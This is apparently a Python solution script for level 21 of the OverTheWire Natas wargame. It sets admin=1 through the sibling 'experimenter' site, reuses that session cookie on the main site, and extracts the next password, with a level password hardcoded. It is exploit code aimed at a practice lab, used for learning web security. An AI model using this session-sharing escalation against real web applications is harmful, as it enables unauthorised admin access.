# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from time import sleep
import requests

def natas21():
    username="natas21"
    password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
    data = {"admin":"1", "submit":"1"}
    session = requests.Session()
    url_experimenter = "http://natas21-experimenter.natas.labs.overthewire.org"
    response = session.post(url_experimenter+"?debug", auth=(username, password), data=data)
    cookies = session.cookies.get_dict()
    url = "http://natas21.natas.labs.overthewire.org/"
    response = session.get(url, auth=(username, password), cookies=cookies)
    content = response.content.decode("utf-8")
    password = re.search(r"(?<=Password: )\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))

if __name__ == "__main__":
    natas21()